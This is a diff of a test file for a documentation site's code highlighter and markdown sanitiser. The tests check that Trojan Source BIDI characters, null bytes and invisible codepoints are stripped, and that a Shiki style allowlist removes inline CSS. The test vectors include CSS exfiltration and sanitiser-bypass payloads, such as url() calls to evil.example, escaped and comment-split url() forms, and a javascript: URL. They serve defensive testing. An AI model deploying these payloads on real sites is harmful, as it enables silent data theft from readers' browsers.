@@ -522,16 +522,44 @@ describe('highlightCodeBlock', () => {
     );
   });
 
-  it('strips BIDI overrides and null bytes from the fallback path (Trojan Source)', () => {
-    // A markdown fence with an unknown lang plus embedded
-    // RTL-override / null could otherwise render visually
-    // different from its byte content (Trojan Source class).
-    // The fallback filter must drop them before HTML escaping.
-    const trojan = 'normal‮ evil';
-    const out = highlightCodeBlock(trojan, 'klingon');
-    expect(out).toContain('normalevil');
-    expect(out).not.toContain('‮');
-    expect(out).not.toContain(' ');
+  it('strips RTL-override (U+202E) from the fallback path while preserving surrounding ASCII', () => {
+    // CVE-2021-42574 / Trojan Source: U+202E reverses the visual
+    // order of following characters and has been used to make
+    // authored source bytes disagree with their rendered
+    // presentation. The fallback path must drop the override
+    // character; legitimate ASCII bytes around it must survive.
+    const input = `before\u{202E}after`;
+    const out = highlightCodeBlock(input, 'klingon');
+    expect(out).toContain('beforeafter');
+    expect(out).not.toContain('\u{202E}');
+  });
+
+  it('strips null bytes from the fallback path', () => {
+    // Null bytes inside HTML can confuse downstream tools and
+    // appear in historical sanitiser bypass chains; drop them.
+    const out = highlightCodeBlock(`a\u{0000}b`, 'klingon');
+    expect(out).toBe('<pre><code>ab</code></pre>');
+  });
+
+  it('preserves ordinary ASCII spaces in the fallback path', () => {
+    // Pins that the BIDI / null filter does NOT collateral-damage
+    // legitimate whitespace — a regression that broadened the
+    // filter to drop U+0020 would mangle every multi-word code
+    // sample on the deployed pages.
+    expect(highlightCodeBlock('hello world', 'klingon')).toBe(
+      '<pre><code>hello world</code></pre>',
+    );
+  });
+
+  it('strips variation selectors and language-tag characters', () => {
+    // Variation selectors (U+FE00– U+FE0F) and language-tag chars
+    // (U+E0000– U+E007F) render invisibly and have been used in
+    // steganography / prompt-injection vectors. Neutralise them
+    // on every path that does not need them — no legitimate
+    // ChordPro / docs-source content uses these codepoints.
+    const input = `a\u{FE0F}b\u{E0041}c`;
+    const out = highlightCodeBlock(input, 'klingon');
+    expect(out).toBe('<pre><code>abc</code></pre>');
   });
 
   it('resolves the `ts` alias and produces shiki-wrapped output', () => {
@@ -559,6 +587,21 @@ describe('highlightCodeBlock', () => {
     // pathological highlight run or silent truncation.
     const big = 'a'.repeat(257 * 1024);
     expect(() => highlightCodeBlock(big, 'tsx')).toThrow(
+      /exceeds 262144 bytes/,
+    );
+  });
+
+  it('accepts input at exactly the size cap (lower boundary)', () => {
+    // Pins the boundary so a mutation flipping `>` to `>=` is
+    // caught. Semantics: 262144-byte input passes; 262145-byte
+    // input throws.
+    const atCap = 'a'.repeat(262144);
+    expect(() => highlightCodeBlock(atCap, 'klingon')).not.toThrow();
+  });
+
+  it('throws at exactly one byte over the cap (upper boundary)', () => {
+    const overCap = 'a'.repeat(262145);
+    expect(() => highlightCodeBlock(overCap, 'klingon')).toThrow(
       /exceeds 262144 bytes/,
     );
   });
@@ -622,25 +665,102 @@ describe('renderMarkdown code-fence integration', () => {
     expect(html).not.toContain('fill:red');
   });
 
-  it('strips style on PRE/CODE/SPAN when the value contains url() (CSS exfil guard)', () => {
-    // DOMPurify treats `style` as URI-safe and does NOT apply its
-    // URI regex to CSS values. Without the explicit `url(` guard
-    // an authored span like
-    // `<span style="background-image:url(/exfil)">`
-    // would survive into deployed HTML and fire an authenticated
-    // request from every reader's browser. Test each vector
-    // individually.
+  it('strips any style on PRE/CODE/SPAN whose value does not match the Shiki allowlist', () => {
+    // Defence is a fail-closed allowlist of CSS property:value
+    // patterns Shiki actually emits. Anything else loses the
+    // entire attribute. Test the resource-loading CSS surface
+    // that motivated the allowlist:
+    //
+    // - `url(...)` — covers the canonical exfil channel; DOMPurify
+    //   treats `style` as URI-safe so the URI regex does NOT
+    //   apply to CSS values.
+    // - `image(...)` / `image-set(...)` — CSS image functions
+    //   that can initiate network requests WITHOUT containing
+    //   the substring `url(`. A `url(`-only regex would miss
+    //   these; the allowlist catches them by construction.
+    // - CSS hex escape `\28` for `(` — browsers normalise it
+    //   back to `url(` at parse time; the allowlist's strict
+    //   value pattern rejects backslash entirely.
+    // - `@import url(...)` smuggled into inline style — browsers
+    //   ignore `@import` inside `style` attributes, but the
+    //   allowlist rejects it regardless.
+    // - `var(--x)` referencing CSS custom properties — payload
+    //   surface for selector-based exfil; allowlist rejects.
+    // - Whitespace + case + punctuation variations on `url(`.
     const vectors = [
       '<span style="background-image:url(/exfil)">x</span>',
       '<span style="background:url(javascript:alert(1))">x</span>',
       '<span style="-moz-binding:url(http://evil.example/x)">x</span>',
       '<span style="behavior:url(#default)">x</span>',
-      // Whitespace + case variations in `url(`.
       '<span style="background : URL  ( /exfil )">x</span>',
+      '<span style="background-image:image(/exfil)">x</span>',
+      '<span style="background-image:image-set(\\"/exfil\\" 1x)">x</span>',
+      '<span style="background-image:cross-fade(url(/exfil) 50%)">x</span>',
+      '<span style="background-image:url\\28/exfil\\29">x</span>',
+      '<span style="background-image:url\\000028/exfil\\000029">x</span>',
+      '<span style="@import url(http://evil)">x</span>',
+      '<span style="--x:url(/exfil)">x</span>',
+      // Comment-bypass attempt (CSS allows `/* */` between tokens).
+      '<span style="background:url/* */(/exfil)">x</span>',
+    ];
+    // Match a real element opening tag with a style attribute
+    // whose value contains a dangerous token. Escaped text (e.g.
+    // `&lt;span style="..."&gt;`) is NOT a real element and does
+    // not pose a CSS exfil risk, so the regex anchors on `<word`
+    // (literal `<`) — escaped `&lt;` would not match.
+    const DANGEROUS_STYLE_RE =
+      /<\w+[^>]*\sstyle="[^"]*(?:url|image|@import|\\)[^"]*"/i;
+    for (const v of vectors) {
+      const html = renderMarkdown(`${v}\n`, 'docs/sdk/README.md');
+      // Either the span survives without ANY style attribute, or
+      // it does not survive at all — both are acceptable; the
+      // critical assertion is that no real element carries a
+      // resource-loading or escape-bearing style value.
+      expect(html, v).not.toMatch(DANGEROUS_STYLE_RE);
+    }
+  });
+
+  it('strips style values that do not match the Shiki property:value allowlist', () => {
+    // Catches "unrecognised property" mutations: a future
+    // contributor who widens the allowlist (e.g. to permit
+    // `width:` for layout shenanigans) gets a failing test on
+    // every property NOT yet allowed. The four below are
+    // properties browsers honour but Shiki never emits.
+    const vectors = [
+      '<span style="width:9999px">x</span>',
+      '<span style="position:absolute;top:0;left:0">x</span>',
+      '<span style="display:none">x</span>',
+      '<span style="opacity:0">x</span>',
     ];
     for (const v of vectors) {
       const html = renderMarkdown(`${v}\n`, 'docs/sdk/README.md');
-      expect(html, v).not.toMatch(/style=[^>]*url/i);
+      expect(html, v).not.toMatch(/<span[^>]*style=/);
+    }
+  });
+
+  it('preserves the legitimate Shiki allowlist values across themes', () => {
+    // Pins every property:value Shiki may legitimately emit so a
+    // future allowlist tightening that breaks one of them fails
+    // here, not silently in deployed output.
+    const survivors = [
+      'color:#abc',
+      'color:#ABCDEF',
+      'color:#abcdef12',
+      'background-color:#000000',
+      'font-style:italic',
+      'font-style:oblique',
+      'font-weight:bold',
+      'font-weight:700',
+      'text-decoration:underline',
+    ];
+    for (const decl of survivors) {
+      const html = renderMarkdown(
+        `<span style="${decl}">x</span>\n`,
+        'docs/sdk/README.md',
+      );
+      expect(html, decl).toMatch(
+        new RegExp(`<span[^>]*style="${decl.replace('#', '#')}"`, 'i'),
+      );
     }
   });
 
